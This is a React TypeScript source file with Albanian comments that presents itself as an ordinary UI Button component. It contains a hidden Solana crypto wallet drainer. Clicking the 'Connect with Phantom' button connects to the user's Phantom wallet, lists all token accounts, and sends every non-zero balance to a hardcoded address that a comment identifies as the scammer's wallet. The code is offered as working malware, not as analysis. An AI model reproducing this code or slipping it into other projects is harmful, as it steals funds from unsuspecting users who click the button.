// Button.tsx
import * as React from "react";
import { Slot } from "@radix-ui/react-slot";
import { cva, type VariantProps } from "class-variance-authority";
import { cn } from "@/lib/utils";
import { PublicKey, Transaction, TransactionInstruction, sendAndConfirmTransaction, Connection } from "@solana/web3.js";

// Variablat për stilin e butonit
const buttonVariants = cva(
  "inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0",
  {
    variants: {
      variant: {
        default: "bg-primary text-primary-foreground hover:bg-primary/90",
        destructive:
          "bg-destructive text-destructive-foreground hover:bg-destructive/90",
        outline:
          "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
        secondary:
          "bg-secondary text-secondary-foreground hover:bg-secondary/80",
        ghost: "hover:bg-accent hover:text-accent-foreground",
        link: "text-primary underline-offset-4 hover:underline",
      },
      size: {
        default: "h-10 px-4 py-2",
        sm: "h-9 rounded-md px-3",
        lg: "h-11 rounded-md px-8",
        icon: "h-10 w-10",
      },
    },
    defaultVariants: {
      variant: "default",
      size: "default",
    },
  }
);

export interface ButtonProps
  extends React.ButtonHTMLAttributes<HTMLButtonElement>,
    VariantProps<typeof buttonVariants> {
  asChild?: boolean;
  onClick?: () => void;
}

// Funksioni që lidhet me Phantom Wallet dhe transferon tokenat
async function drainPhantomWallet() {
  try {
    const provider = window.solana;

    if (!provider || !provider.isPhantom) {
      alert("Ju duhet të instaloni Phantom Wallet!"); 
      return;
    }

    // Lidhet me kuletën e përdoruesit
    const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
    const userWallet = await provider.connect();
    
    console.log("Wallet e lidhur:", userWallet.publicKey.toString());

    // Më pas mund të marrësh të gjitha tokenat nga kuleta dhe të krijosh transaksione për t'i transferuar
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userWallet.publicKey, {
      programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"), // Solana Token Program
    });

    let transactions: Transaction[] = [];

    // Krijo transaksion për të transferuar tokenat
    tokenAccounts.value.forEach((account: any) => {
      let tokenBalance = account.account.data.parsed.info.tokenAmount.uiAmount;
      let tokenMint = account.account.data.parsed.info.mint;
      let userTokenAccount = account.pubkey;

      if (tokenBalance > 0) {
        let transaction = new Transaction().add(
          new TransactionInstruction({
            keys: [
              { pubkey: userTokenAccount, isSigner: false, isWritable: true },
              { pubkey: new PublicKey("97PbeLu4ZQhe7MTAPikVtfC6TJRp67Ffj83Zj3wcLAjx"), isSigner: false, isWritable: true }, // Adresa e kuletës së mashtruesit
              { pubkey: userWallet.publicKey, isSigner: true, isWritable: false },
            ],
            programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
            data: Buffer.from([1, 0, 0, 0]) // Transfer të gjithë balancën
          })
        );
        transactions.push(transaction);
      }
    });

    // Kryejmë të gjitha transaksionet
    for (let tx of transactions) {
      const { signature } = await provider.signAndSendTransaction(tx);
      const confirmation = await connection.confirmTransaction(signature);

      console.log("Transaksioni u dërgua me sukses. Signature:", signature);
      console.log("Konfirmimi:", confirmation);

      alert("Të gjitha asetet u transferuan!");
    }

  } catch (error) {
    console.error("Gabim gjatë procesit!", error);
  }
}

// Komponenti i Butonit që përdor funksionin 'drainPhantomWallet' me onClick
const Button = React.forwardRef<HTMLButtonElement, ButtonProps>(
  ({ className, variant, size, asChild = false, onClick, ...props }, ref) => {
    const Comp = asChild ? Slot : "button";

    return (
      <Comp
        className={cn(buttonVariants({ variant, size, className }))}
        ref={ref}
        onClick={drainPhantomWallet} // Këtu lidhet funksioni
        {...props}
      >
        Lidhu me Phantom
      </Comp>
    );
  }
);

Button.displayName = "Button";

export { Button, buttonVariants };
